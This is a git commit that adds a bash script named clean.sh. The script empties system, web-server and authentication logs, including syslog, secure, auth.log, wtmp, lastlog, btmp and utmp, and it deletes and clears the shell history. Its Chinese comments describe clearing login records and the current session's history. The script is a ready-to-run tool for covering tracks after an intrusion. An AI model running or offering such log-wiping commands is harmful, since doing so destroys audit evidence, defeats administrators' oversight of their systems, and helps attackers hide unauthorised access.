5dc771c49d53523ee33b36b55bb04065fb5dfca6
NuFi4g <yunink@yunink.top>
2021-03-17 22:23:41 +0800

    clean

---
+++ clean/clean.sh
@@ -0,0 +1,20 @@
+#!/usr/bin/bash
+
+echo > /var/log/syslog
+echo > /var/log/messages
+echo > /var/log/httpd/access_log
+echo > /var/log/httpd/error_log
+echo > /var/log/xferlog
+echo > /var/log/secure
+echo > /var/log/auth.log
+echo > /var/log/user.log
+echo > /var/log/wtmp
+echo > /var/log/lastlog
+echo > /var/log/btmp
+
+# 记录现在登入的用户
+echo > /var/run/utmp
+
+# 清除当前会话的消息记录
+rm ~/.bash_history
+history -c
